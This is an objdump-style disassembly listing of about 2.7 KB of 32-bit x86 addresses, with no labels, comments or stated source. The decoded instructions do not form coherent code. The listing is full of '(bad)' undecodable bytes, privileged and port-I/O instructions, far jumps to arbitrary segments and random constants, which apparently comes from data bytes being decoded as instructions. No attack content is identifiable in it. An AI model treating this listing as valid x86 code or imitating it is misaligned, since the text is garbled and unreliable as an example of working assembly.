  4277ad:	mov    ebx,0xac79595
  4277b2:	mov    edi,0xb9eda145
  4277b7:	(bad)  
  4277b8:	mov    esi,DWORD PTR [ebp+ebp*2-0x74]
  4277bc:	test   al,0x8d
  4277be:	and    DWORD PTR [ecx+0x8f53ad9],0x46
  4277c5:	cli    
  4277c6:	sub    DWORD PTR [ebx+0x36e17626],0xa
  4277cd:	mov    dh,0x45
  4277cf:	lea    ebx,[edx+edi*1]
  4277d2:	xchg   edi,eax
  4277d3:	sar    DWORD PTR [edx+0x1c],0x50
  4277d7:	sbb    ebp,DWORD PTR [edx+eax*4-0x6061bce2]
  4277de:	jecxz  0x4277b3
  4277e0:	and    BYTE PTR [ebx-0x4b],ah
  4277e3:	jmp    0x52c8:0x6a3737a7
  4277ea:	jns    0x42782b
  4277ec:	mov    ah,BYTE PTR [edi-0x46]
  4277ef:	xchg   ah,dh
  4277f1:	xchg   edx,eax
  4277f2:	jne    0x427792
  4277f4:	jbe    0x4277b8
  4277f6:	(bad)  
  4277f7:	jbe    0x4277a8
  4277f9:	sbb    BYTE PTR [ebx],bl
  4277fb:	push   ebp
  4277fc:	scas   al,BYTE PTR es:[edi]
  4277fd:	cdq    
  4277fe:	dec    edx
  4277ff:	(bad)  [ebp+0x718f72fc]
  427805:	arpl   sp,dx
  427807:	je     0x4277c6
  427809:	int3   
  42780a:	push   cs
  42780b:	jge    0x4277d7
  42780d:	pop    ss
  42780e:	hlt    
  42780f:	jp     0x42779a
  427811:	inc    ebp
  427812:	sub    al,0x7e
  427814:	sbb    eax,0xa1a8f250
  427819:	jg     0x4277c7
  42781b:	dec    esi
  42781c:	mov    bl,ah
  42781e:	test   BYTE PTR [edi],0x6
  427821:	xor    BYTE PTR [eax],0x81
  427824:	shl    BYTE PTR [ebx],1
  427826:	jp     0x4277f3
  427828:	shl    dl,0xba
  42782b:	and    al,0x8c
  42782d:	fnstsw WORD PTR [ebx]
  42782f:	jbe    0x427883
  427831:	fstp   st(2)
  427833:	dec    ebx
  427834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427835:	test   edi,eax
  427837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427838:	imul   edx,DWORD PTR [ebx+0x12b42a28],0x72cd64fc
  427842:	jmp    0x4277f7
  427844:	je     0x4277fa
  427846:	(bad)  
  427847:	in     al,0x1c
  427849:	or     BYTE PTR [edi+0x2a],dl
  42784c:	mov    bh,0x82
  42784e:	shr    DWORD PTR [ebx],0x57
  427851:	xchg   ebp,eax
  427852:	mov    ah,0x36
  427854:	jp     0x4278d3
  427856:	lea    ecx,[esi+0x665b27ae]
  42785c:	jns    0x4278ce
  42785e:	in     eax,dx
  42785f:	cmp    al,0xef
  427861:	push   eax
  427862:	fcom   st(4)
  427864:	fwait
  427865:	lea    eax,[ebx]
  427867:	jle    0x427846
  427869:	ret    0x8289
  42786c:	sub    al,0x0
	...
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	xor    esp,DWORD PTR [edi+esi*8+0xf]
  4278e6:	xchg   esi,eax
  4278e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278e8:	add    DWORD PTR [eax],eax
  4278ea:	inc    DWORD PTR [eax]
  4278ec:	add    BYTE PTR [eax],al
  4278ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278ef:	scas   al,BYTE PTR es:[edi]
  4278f0:	pop    ds
  4278f1:	mov    BYTE PTR ds:0xfa0ac8f5,dh
  4278f7:	int    0xf2
  4278f9:	mov    ebp,0x7c0c9679
  4278fe:	(bad)  
  4278ff:	call   0xf5a90c2
  427904:	sbb    DWORD PTR [ebp+0x5f],ebp
  427907:	adc    DWORD PTR [ebx],ebp
  427909:	das    
  42790a:	jo     0x42796c
  42790c:	mov    BYTE PTR [esi],dh
  42790e:	cmp    dh,ch
  427910:	out    0xb4,eax
  427912:	pop    es
  427913:	push   edi
  427914:	loop   0x4278fa
  427916:	cmp    dl,BYTE PTR [edi-0x49]
  427919:	jg     0x427998
  42791b:	lods   al,BYTE PTR ds:[esi]
  42791c:	and    edi,DWORD PTR [eax-0x9b379d2]
  427922:	push   ebx
  427923:	pop    eax
  427924:	mov    eax,ds:0xf4d7390c
  427929:	out    0x2d,al
  42792b:	repnz add eax,DWORD PTR [edx-0x6ed48e4]
  427932:	pop    ss
  427933:	and    DWORD PTR [ecx-0x50ca453a],edi
  427939:	out    0xdf,eax
  42793b:	push   esi
  42793c:	cmp    edx,ecx
  42793e:	dec    ebx
  427940:	popf   
  427941:	jecxz  0x4279b4
  427943:	dec    ebp
  427944:	push   ss
  427945:	pop    edi
  427946:	mov    esi,0x9850465c
  42794b:	ss fwait
  42794d:	sub    DWORD PTR [eax-0x47],esi
  427950:	mov    ah,0xac
  427952:	lods   eax,DWORD PTR ds:[esi]
  427953:	icebp  
  427954:	mov    eax,ds:0x38555eae
  427959:	mov    dl,0x1c
  42795b:	retf   0xa395
  42795e:	(bad)  
  427960:	js     0x4278ef
  427962:	jmp    DWORD PTR [ebp-0x32]
  427965:	(bad)  
  427966:	scas   eax,DWORD PTR es:[edi]
  427967:	pop    esi
  427968:	(bad)  
  427969:	mov    eax,0xedeb18b2
  42796e:	dec    ebx
  42796f:	sti    
  427970:	xor    esp,ebx
  427972:	out    0xae,eax
  427974:	mov    al,BYTE PTR [esi+0x2154b64e]
  42797a:	or     esp,esi
  42797c:	and    DWORD PTR [ebx+0x25577cc5],0x5724756e
  427986:	repnz mov esi,DWORD PTR [eax+0x50]
  42798a:	and    esp,DWORD PTR ds:0xb4c8738b
  427990:	inc    edx
  427991:	ins    BYTE PTR es:[edi],dx
  427992:	clc    
  427993:	ss in  al,dx
  427995:	pop    edi
  427996:	out    0x38,eax
  427998:	scas   al,BYTE PTR es:[edi]
  427999:	mov    eax,ds:0x81ca97e1
  42799e:	jecxz  0x427940
  4279a0:	sbb    bl,BYTE PTR [ebx+0x22]
  4279a3:	or     BYTE PTR [ecx+edx*8],ch
  4279a6:	xor    BYTE PTR [edi+eax*8],cl
  4279a9:	pop    eax
  4279aa:	bound  esi,QWORD PTR [ebp+0x20]
  4279ad:	xchg   ebp,eax
  4279ae:	cs in  eax,0x93
  4279b1:	and    dl,BYTE PTR [ecx+0x3a]
  4279b4:	jo     0x427978
  4279b6:	push   esi
  4279b7:	and    DWORD PTR [esi-0x70],ebx
  4279ba:	retf   
  4279bb:	ja     0x427a29
  4279bd:	icebp  
  4279be:	inc    esp
  4279bf:	in     eax,dx
  4279c0:	cmp    ch,dh
  4279c2:	jns    0x42798b
  4279c4:	repz mov bl,0x15
  4279c7:	fs mov ecx,0xff09cc00
  4279cd:	aam    0x6
  4279cf:	pop    esp
  4279d0:	out    0x59,eax
  4279d2:	fcom   st(3)
  4279d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279d5:	data16 jo 0x427969
  4279d8:	xchg   eax,eax
  4279da:	out    0xba,eax
  4279dc:	push   0xffffffee
  4279de:	cmp    BYTE PTR [ecx-0x1f02d852],dh
  4279e4:	(bad)  
  4279e5:	and    al,0xba
  4279e7:	arpl   WORD PTR [edx+0x21db48bb],cx
	...
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx-0x3f0229ab]
  427a66:	xchg   ebp,eax
  427a67:	test   al,0x1
  427a69:	add    bh,bh
  427a6b:	add    BYTE PTR [eax],al
  427a6d:	add    BYTE PTR [esi-0x9],dh
  427a70:	sbb    DWORD PTR [edi+0x169c80bd],ecx
  427a76:	dec    DWORD PTR ds:[eax-0xe]
  427a7a:	retf   0x7400
  427a7d:	cdq    
  427a7e:	cmc    
  427a7f:	mov    ch,0xde
  427a81:	pop    ebp
  427a82:	ror    dl,cl
  427a84:	int3   
  427a85:	push   ss
  427a86:	mov    cl,0x16
  427a88:	adc    DWORD PTR ds:0xfa9db92d,esp
  427a8e:	sub    al,0xb7
  427a90:	out    dx,eax
  427a91:	(bad)  
  427a92:	cwde   
  427a93:	and    DWORD PTR [ebx+0x51],esp
  427a96:	cmc    
  427a97:	std    
  427a98:	push   esp
  427a99:	jmp    0x6fb378b4
  427a9e:	push   ds
  427a9f:	mov    dl,0x32
  427aa1:	shl    DWORD PTR [ecx],1
  427aa3:	ins    BYTE PTR es:[edi],dx
  427aa4:	dec    ecx
  427aa5:	push   0xffffffd7
  427aa7:	push   edx
  427aa8:	and    BYTE PTR [esi-0x8],bh
  427aab:	fmul   QWORD PTR [edx-0x12ab671]
  427ab1:	and    eax,0x98b39b33
  427ab6:	mov    al,0xfb
  427ab8:	mov    gs,WORD PTR [ebx-0x503196a5]
  427abe:	(bad)  
  427abf:	cmp    al,0xcb
  427ac1:	pop    edi
  427ac2:	popf   
  427ac3:	mov    ds:0x478b715b,eax
  427ac8:	jb     0x427ab9
  427aca:	sti    
  427acb:	retf   
  427acc:	mov    eax,ds:0x5abffe3e
  427ad1:	jmp    DWORD PTR [ecx+edx*1-0x5d4ff5d4]
  427ad8:	mov    edi,0x9a25b9df
  427add:	aad    0x66
  427adf:	cmc    
  427ae0:	pop    ss
  427ae1:	jecxz  0x427ad3
  427ae3:	dec    edx
  427ae4:	push   ebx
  427ae5:	lods   al,BYTE PTR ds:[esi]
  427ae6:	and    ah,BYTE PTR [edi]
  427ae8:	pop    es
  427ae9:	repnz test DWORD PTR [edi+0x2eb791c6],eax
  427af0:	mov    esp,0x50ae3241
  427af5:	sub    DWORD PTR ds:0xfe355fbe,0x59a84e8d
  427aff:	(bad)  
  427b01:	dec    ebp
  427b02:	mov    fs,WORD PTR [esi]
  427b04:	mov    esi,0x81e91726
  427b09:	xor    ebx,DWORD PTR [ebx]
  427b0b:	pop    ds
  427b0c:	dec    esi
  427b0d:	jno    0x427b17
  427b0f:	jmp    0xf433:0xd4c5b0b9
  427b16:	out    dx,eax
  427b17:	mov    ebx,esp
  427b19:	xchg   ebx,eax
  427b1a:	sbb    ah,BYTE PTR [ebx]
  427b1c:	pusha  
  427b1d:	mov    edi,0x9ad89b54
  427b22:	les    ebp,FWORD PTR [ebp-0x7248a656]
  427b28:	fdivr  st,st(6)
  427b2a:	adc    ch,BYTE PTR [edi+0x16ce19c]
  427b30:	dec    ebx
  427b31:	cmp    DWORD PTR [ecx],esp
  427b33:	outs   dx,DWORD PTR ds:[esi]
  427b34:	add    BYTE PTR [ebx],bl
  427b36:	mov    ds:0x28d8947a,al
  427b3b:	adc    esi,esp
  427b3d:	xlat   BYTE PTR ds:[ebx]
  427b3e:	sbb    esp,eax
  427b40:	sub    ah,dl
  427b42:	mov    BYTE PTR [ecx+0x579f8fc],cl
  427b48:	neg    BYTE PTR [ebx-0x77]
  427b4b:	push   esp
  427b4c:	mov    al,0x65
  427b4e:	jo     0x427b0e
  427b50:	test   al,0x9d
  427b52:	xchg   esp,eax
  427b53:	pop    ss
  427b54:	pop    es
  427b55:	aad    0xf3
  427b57:	xor    esp,edx
  427b59:	aas    
  427b5a:	imul   eax,DWORD PTR [eax+0x58195f11],0xaefc76b9
  427b64:	sub    eax,0x34279229
  427b69:	jnp    0x427b7a
  427b6b:	dec    ecx
  427b6c:	pop    ss
	...
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	not    BYTE PTR [esi-0x66]
  427be4:	ja     0x427c15
  427be6:	xchg   esp,eax
  427be7:	test   eax,0xff0001
  427bec:	add    BYTE PTR [eax],al
  427bee:	(bad)  
  427bef:	das    
  427bf0:	inc    esp
  427bf1:	jae    0x427be8
  427bf3:	sub    edx,DWORD PTR [edx+0x74]
  427bf6:	mov    ecx,0x5f76b8c8
  427bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bfc:	pop    es
  427bfd:	and    BYTE PTR [ecx+0xb79ae0a],bh
  427c03:	in     eax,dx
  427c04:	jge    0x427bea
  427c06:	xor    eax,0x37d487aa
  427c0b:	int    0x51
  427c0d:	popa   
  427c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c0f:	pop    ds
  427c10:	fisttp QWORD PTR [ebx-0x6990ee51]
  427c16:	test   DWORD PTR [ebx-0x76],0x623ceef1
  427c1d:	stos   DWORD PTR es:[edi],eax
  427c1e:	fiadd  WORD PTR [esi]
  427c20:	sub    eax,0x9ec69ef4
  427c25:	cmc    
  427c26:	mov    cl,0x24
  427c28:	sbb    BYTE PTR [esi],bl
  427c2a:	cs in  al,0x69
  427c2d:	dec    ebp
  427c2e:	(bad)  
  427c2f:	sub    al,0xf7
  427c31:	fsub   DWORD PTR [esi]
  427c33:	push   cs
  427c34:	int3   
  427c35:	mov    ecx,0xfae869
  427c3a:	fidiv  WORD PTR [edi+0x26610ef2]
  427c40:	push   ds
  427c41:	add    al,0x37
  427c43:	int    0xba
  427c45:	cmp    BYTE PTR [ecx],bl
  427c47:	xchg   DWORD PTR [esi+0x2f84bffa],edx
  427c4d:	fwait
  427c4e:	(bad)  
  427c4f:	icebp  
  427c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c51:	popf   
  427c52:	sub    eax,DWORD PTR [esi-0x80]
  427c55:	xor    al,0x8c
  427c57:	pop    ds
  427c58:	out    0xdb,eax
  427c5a:	retf   0x28e1
  427c5d:	sbb    cl,BYTE PTR [edx+0x74c92096]
  427c63:	retf   
  427c64:	push   ds
  427c65:	fs pop esi
  427c67:	hlt    
  427c68:	addr16 sahf 
  427c6a:	mov    edi,0x98420e83
  427c6f:	inc    esi
  427c70:	push   esi
  427c71:	xchg   esi,eax
  427c72:	inc    edx
  427c73:	repz xor al,0x53
  427c76:	imul   edx,DWORD PTR [ecx],0x1f
  427c79:	stos   DWORD PTR es:[edi],eax
  427c7a:	adc    DWORD PTR [ecx-0xf63f865],ebx
  427c80:	repnz push ds
  427c82:	fwait
  427c83:	sub    DWORD PTR [eax+esi*8+0x5fdff06e],edi
  427c8a:	loope  0x427c69
  427c8c:	pop    ebx
  427c8d:	push   ds
  427c8e:	mov    ds:0x1a7f413c,eax
  427c93:	sub    eax,0xb54001ad
  427c98:	jg     0x427cce
  427c9a:	xor    esi,ecx
  427c9c:	dec    esi
  427c9d:	cmc    
  427c9e:	icebp  
  427c9f:	mov    ds:0x613af8da,eax
  427ca4:	in     al,dx
  427ca5:	push   ds
  427ca6:	iret   
  427ca7:	sub    BYTE PTR [ebp-0x49],bh
  427caa:	pop    ss
  427cab:	xchg   esp,eax
  427cac:	je     0x427ca4
  427cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427caf:	inc    edx
  427cb0:	jmp    0xbfc0:0x9e29f85f
  427cb7:	mov    edi,0x5fed6e3e
  427cbc:	enter  0x79c1,0x41
  427cc0:	dec    ebp
  427cc1:	ret    
  427cc2:	mov    eax,0x34594b19
  427cc7:	pop    ebp
  427cc8:	pop    ss
  427cc9:	xor    al,0xa1
  427ccb:	fmul   DWORD PTR [ebx-0x3e11fc3a]
  427cd1:	xchg   DWORD PTR [eax],edi
  427cd3:	adc    DWORD PTR [eax],ebp
  427cd5:	inc    esp
  427cd6:	adc    eax,0x16d6579c
  427cdb:	or     BYTE PTR [ecx],al
  427cdd:	jb     0x427c9f
  427cdf:	push   esi
  427ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ce2:	add    eax,0xc180e7d5
  427ce7:	dec    edi
  427ce8:	jne    0x427d05
  427cea:	inc    esp
  427ceb:	add    edi,ebp
	...
  427d55:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xfbd85d44,ebx
  427d64:	int    0x73
  427d66:	xchg   ebx,eax
  427d67:	stos   BYTE PTR es:[edi],al
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	inc    DWORD PTR [eax]
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	dec    ebx
  427d6f:	cvtdq2ps xmm7,xmm2
  427d72:	sahf   
  427d73:	sbb    DWORD PTR [eax+0xfd1be13],edx
  427d79:	neg    DWORD PTR ds:0xc71011b1
  427d7f:	fisub  WORD PTR [eax]
  427d81:	in     al,dx
  427d82:	cmp    al,0x87
  427d84:	std    
  427d85:	ror    BYTE PTR [ecx-0x6e4fb301],cl
  427d8b:	sub    BYTE PTR [ecx+0x6d],bl
  427d8e:	out    0x55,al
  427d90:	push   0x15
  427d92:	in     eax,dx
  427d93:	dec    edi
  427d94:	jo     0x427e15
  427d96:	mov    dl,0x52
  427d98:	cmp    eax,0xb7a101e2
  427d9d:	div    ch
  427d9f:	jns    0x427d6b
  427da1:	adc    esi,DWORD PTR [eax]
  427da3:	mov    ch,0x51
  427da5:	xor    al,0xfb
  427da7:	or     eax,0x5dc7d51f
  427dac:	aaa    
  427dad:	mov    eax,DWORD PTR [esi-0x35b1054d]
  427db3:	push   ds
  427db4:	cmp    dh,al
  427db6:	mov    bl,0xd8
  427db8:	sbb    eax,0xe22bbee
  427dbd:	sub    BYTE PTR [ecx],0x95
  427dc0:	jp     0x427dd9
  427dc2:	add    DWORD PTR [edx-0x2ed20a9b],eax
  427dc8:	push   ds
  427dc9:	mov    eax,ds:0x731bdbdb
  427dce:	jnp    0x427e22
  427dd0:	js     0x427d61
  427dd2:	push   es
  427dd3:	push   cs
  427dd4:	push   cs
  427dd5:	cmp    edi,0xc74aa954
  427ddb:	push   ecx
  427ddc:	dec    esp
  427ddd:	mov    ebx,0x456a371e
  427de2:	lods   eax,DWORD PTR ds:[esi]
  427de3:	sbb    DWORD PTR [eax],edx
  427de5:	cmp    esi,DWORD PTR [edx]
  427de7:	adc    ecx,DWORD PTR [eax-0x7c]
  427dea:	and    DWORD PTR [ebp+ecx*1+0x609a923f],esp
  427df1:	push   ss
  427df2:	push   es
  427df3:	popa   
  427df4:	cdq    
  427df5:	jmp    0x8317:0x74617d4a
  427dfc:	jl     0x427ded
  427dfe:	or     BYTE PTR [ebx-0x6e57b4a4],ch
  427e04:	inc    ebp
  427e05:	cdq    
  427e06:	mov    ds:0xff212dc1,al
  427e0b:	outs   dx,DWORD PTR ds:[esi]
  427e0c:	pop    ecx
  427e0d:	je     0x427e12
  427e0f:	jo     0x427da4
  427e11:	xor    ah,BYTE PTR [ebx+edi*4-0x4d43dc4a]
  427e18:	loope  0x427dc5
  427e1a:	lods   al,BYTE PTR ds:[esi]
  427e1b:	out    0xc3,al
  427e1d:	or     eax,0x2011390f
  427e22:	cdq    
  427e23:	jne    0x427e5e
  427e25:	gs stos DWORD PTR es:[edi],eax
  427e27:	pushf  
  427e28:	push   0x3108de82
  427e2d:	adc    al,0x87
  427e2f:	xchg   ecx,eax
  427e30:	arpl   bp,si
  427e32:	push   0x2537d756
  427e37:	inc    edx
  427e38:	mov    ebx,0xa771aefb
  427e3d:	xor    BYTE PTR [esi-0x6],al
  427e40:	fidivr WORD PTR [ecx+0x12]
  427e43:	dec    ecx
  427e44:	inc    esi
  427e45:	dec    ecx
  427e46:	sub    BYTE PTR [eax+0x19],bl
  427e49:	imul   edi
  427e4b:	sub    eax,0x3137162b
  427e50:	popf   
  427e51:	xor    BYTE PTR ds:0xe3086424,al
  427e57:	ins    DWORD PTR es:[edi],dx
  427e58:	push   edi
  427e59:	mov    esp,0x25588cf7
  427e5e:	jmp    0x75770ebb
  427e63:	nop
  427e64:	ret    
  427e65:	sub    cl,dh
  427e67:	mov    BYTE PTR [eax+0x3],dh
  427e6a:	mov    ds:0x98d8,al
	...
  427ed3:	add    BYTE PTR [eax],al
  427ed5:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	jo     0x427e88
  427ee4:	inc    eax
  427ee5:	addr16 xchg edx,eax
  427ee7:	stos   DWORD PTR es:[edi],eax
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	inc    DWORD PTR [eax]
  427eec:	add    BYTE PTR [eax],al
  427eee:	fst    DWORD PTR [edx+0x3339a327]
  427ef4:	push   ecx
  427ef5:	or     bh,BYTE PTR [edi]
  427ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ef8:	dec    esi
  427ef9:	adc    BYTE PTR [ebx+0x7],ah
  427efc:	jae    0x427ec2
  427efe:	jle    0x427eef
  427f00:	ret    0x4ba1
  427f03:	dec    esp
  427f04:	leave  
  427f05:	enter  0xfa86,0x84
  427f09:	icebp  
  427f0a:	jle    0x427ede
  427f0c:	(bad)  
  427f0e:	imul   ebx,DWORD PTR [ebx],0x10ab5da
  427f14:	fisub  WORD PTR [edi-0x73a494cc]
  427f1a:	xor    DWORD PTR [ecx-0x2d739bd1],ecx
  427f20:	mov    edx,0x3d073660
  427f25:	les    edx,FWORD PTR [ecx]
  427f27:	pop    ds
  427f28:	pop    esp
  427f29:	mov    al,ds:0x57931df3
  427f2e:	cmp    al,0x76
  427f30:	sbb    eax,0x8623130b
  427f35:	lock dec ecx
  427f37:	pop    ss
  427f38:	mov    dh,0x1c
  427f3a:	fiadd  DWORD PTR [edx+ebp*8+0x31]
  427f3e:	arpl   si,ax
  427f40:	dec    eax
  427f41:	add    al,0x39
  427f43:	(bad)  
  427f44:	sbb    al,0x9f
  427f46:	jl     0x427f0b
  427f48:	(bad)  
  427f49:	pop    edx
  427f4a:	dec    edi
  427f4b:	and    DWORD PTR [eax+0x43],edx
  427f4e:	loopne 0x427fa6
  427f50:	xor    bh,dl
  427f52:	dec    ecx
  427f53:	les    edx,FWORD PTR [edx]
  427f55:	inc    edi
  427f56:	jmp    0x427f27
  427f58:	sub    eax,0x769ad6
  427f5d:	mov    BYTE PTR [edi],dl
  427f5f:	mov    ebx,0x587842ba
  427f64:	cdq    
  427f65:	(bad)  
  427f66:	in     eax,dx
  427f67:	inc    ebx
  427f68:	outs   dx,DWORD PTR ds:[esi]
  427f69:	cmp    al,0xb0
  427f6b:	imul   edx,DWORD PTR [eax-0x3912b90f],0x7bad21f
  427f75:	adc    ch,BYTE PTR [esi]
  427f77:	sub    eax,DWORD PTR [edi+0x7f]
  427f7a:	jge    0x427f90
  427f7c:	fistp  WORD PTR [edx+0x772b88ae]
  427f82:	lods   eax,DWORD PTR ds:[esi]
  427f83:	stos   DWORD PTR es:[edi],eax
  427f84:	mov    edi,0x2d7307da
  427f89:	fs xchg bl,dl
  427f8c:	fnstcw WORD PTR [esi-0x2bac0b7f]
  427f92:	push   0x1d
  427f94:	dec    edi
  427f95:	cld    
  427f96:	rol    DWORD PTR [eax+0x1c28ede6],0x8f
  427f9d:	pop    eax
  427f9e:	adc    DWORD PTR [ebx],ebp
  427fa0:	int3   
  427fa1:	out    dx,al
  427fa2:	pop    ebp
  427fa3:	lods   eax,DWORD PTR ds:[esi]
  427fa4:	enter  0xd9d2,0xfa
  427fa8:	loope  0x427f7a
  427faa:	push   ebp
  427fab:	add    DWORD PTR [ebp+0x22da2536],eax
  427fb1:	dec    edi
  427fb2:	rcl    BYTE PTR [ebp+0x57],0x1b
  427fb6:	pop    ecx
  427fb7:	push   esp
  427fb8:	dec    ebx
  427fb9:	ffree  st(3)
  427fbb:	(bad)  
  427fbc:	cld    
  427fbd:	dec    esp
  427fbe:	and    DWORD PTR ds:0xb4ad2bba,esp
  427fc4:	fiadd  WORD PTR [edx]
  427fc6:	or     eax,0x873234e2
  427fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fcc:	test   BYTE PTR [ebp+0x73],0x82
  427fd0:	lahf   
  427fd1:	adc    al,0x55
  427fd3:	push   ds
  427fd4:	ds cdq 
  427fd6:	or     al,0x5
  427fd8:	sbb    eax,0x55856aca
  427fdd:	push   ebp
  427fde:	push   ecx
  427fdf:	(bad)  
  427fe1:	repz push edx
  427fe3:	ins    BYTE PTR es:[edi],dx
  427fe4:	(bad)  
  427fe5:	xchg   BYTE PTR [ebp+0x23ebb1bf],dh
  427feb:	sub    DWORD PTR ds:0x0,esp
	...
  428055:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	fs out dx,eax
  428064:	push   edi
  428065:	pop    ds
  428066:	xchg   ecx,eax
  428067:	lods   al,BYTE PTR ds:[esi]
  428068:	add    DWORD PTR [eax],eax
  42806a:	inc    DWORD PTR [eax]
  42806c:	add    BYTE PTR [eax],al
  42806e:	adc    esi,edx
  428070:	pop    ds
  428071:	sbb    BYTE PTR [ecx+0x3d],cl
  428074:	pusha  
  428075:	mov    dl,ch
  428077:	xor    eax,0x6778b320
  42807c:	sub    cl,BYTE PTR [edx+0x4d]
  42807f:	cmp    esi,0x46c9bc20
  428085:	jae    0x42800e
  428087:	pop    eax
  428088:	adc    eax,eax
  42808a:	stos   BYTE PTR es:[edi],al
  42808b:	retf   0x4668
  42808e:	mov    edx,0x346bf917
  428093:	or     eax,0xf039a7
  428098:	cs cmp bh,cl
  42809b:	xor    al,BYTE PTR [edi]
  42809d:	mov    cl,0xf
  42809f:	mov    edx,0x4b2e6a2f
  4280a4:	(bad)  
  4280a5:	retf   0x1ae6
  4280a8:	(bad)  
  4280a9:	cmp    edi,DWORD PTR [edx+0x23]
  4280ac:	pusha  
  4280ad:	add    eax,0x4215a5ed
  4280b2:	lahf   
  4280b3:	push   edi
  4280b4:	sub    al,0x47
  4280b6:	aaa    
  4280b7:	gs xchg ebp,eax
  4280b9:	jecxz  0x4280e3
  4280bb:	xchg   esp,eax
  4280bc:	jle    0x428060
  4280be:	or     ebx,DWORD PTR [ebx-0x69]
  4280c1:	cdq    
  4280c2:	jmp    0x6579b61c
  4280c7:	or     cl,BYTE PTR [eax]
  4280c9:	imul   eax,DWORD PTR [eax-0xa1a1025],0x8e36ac79
  4280d3:	pop    esp
  4280d4:	iret   
  4280d5:	loope  0x42812c
  4280d7:	out    0x66,al
  4280d9:	xchg   DWORD PTR [esi+edi*1+0x61613bc7],ecx
  4280e0:	and    DWORD PTR [edx-0x4a],0x18
  4280e4:	repnz inc ecx
  4280e6:	aas    
  4280e7:	add    eax,0xfd08c140
  4280ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280ed:	sbb    eax,0xadab9963
  4280f2:	call   0xfcd7:0x98abc128
  4280f9:	retf   0x12de
  4280fc:	push   edi
  4280fd:	sbb    BYTE PTR [edx-0x73],dl
  428100:	sub    al,0xb0
  428102:	or     DWORD PTR [esi-0x37],ebx
  428105:	outs   dx,DWORD PTR ds:[esi]
  428106:	cmp    BYTE PTR [ebx+0x22],al
  428109:	mov    WORD PTR [ecx+0x1353cfcc],?
  42810f:	fnstsw WORD PTR [ebp+0x7c]
  428112:	pop    ebx
  428113:	xchg   ebx,eax
  428114:	adc    edi,DWORD PTR [ebx]
  428116:	push   edx
  428117:	pusha  
  428118:	lds    esi,FWORD PTR [eax+0x31]
  42811b:	xor    ch,BYTE PTR [ebx-0x7bf7201e]
  428121:	mov    bh,0xb4
  428123:	ja     0x4280ab
  428125:	stos   DWORD PTR es:[edi],eax
  428126:	cld    
  428127:	std    
  428128:	pushf  
  428129:	sti    
  42812a:	add    al,0xe8
  42812c:	in     eax,0xe
  42812e:	sbb    DWORD PTR [edi],edi
  428130:	adc    al,0x36
  428132:	jmp    0x8538:0x80b7ced4
  428139:	nop
  42813a:	pop    ebp
  42813b:	push   esi
  42813c:	mov    edi,0x2534d979
  428141:	imul   DWORD PTR [eax+0x2]
  428144:	sub    DWORD PTR [edx+0x343e1a6b],ebp
  42814a:	inc    ecx
  42814b:	mov    edx,DWORD PTR [esi-0x33]
  42814e:	ss stos DWORD PTR es:[edi],eax
  428150:	out    dx,al
  428151:	mov    ebp,0x6aa3ed53
  428156:	ret    0x2229
  428159:	or     edx,DWORD PTR [edi+0x79d8f4a]
  42815f:	(bad)  
  428160:	shr    BYTE PTR [edi],1
  428162:	sub    DWORD PTR [eax+eax*2],ebx
  428165:	and    esi,ecx
  428167:	int3   
  428168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428169:	(bad)  
  42816a:	cmp    ebp,DWORD PTR [edi]
  42816c:	mov    al,BYTE PTR [eax]
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	mov    dl,0x4d
  4281e4:	mov    ds:0x1ad90dd,al
  4281e9:	add    bh,bh
  4281eb:	add    BYTE PTR [eax],al
  4281ed:	add    BYTE PTR [ebp+0x55],ah
  4281f0:	cmp    DWORD PTR [edx],esi
  4281f2:	sub    DWORD PTR [ebx+0x1173c296],ebp
  4281f8:	je     0x428225
  4281fa:	adc    eax,0x30f019f9
  4281ff:	lods   eax,DWORD PTR ds:[esi]
  428200:	popf   
  428201:	sub    eax,0x33b2ad97
  428206:	mov    ecx,0xb4295a4d
  42820b:	sbb    BYTE PTR [ebp+0x62bb58a9],0x11
  428212:	aaa    
  428213:	jne    0x428240
  428215:	rcl    BYTE PTR [esp+edx*4+0x1e55434c],1
  42821c:	xchg   ecx,eax
  42821d:	push   0x60
  42821f:	imul   ebp,DWORD PTR [eax],0x30
  428222:	fwait
  428223:	pop    edi
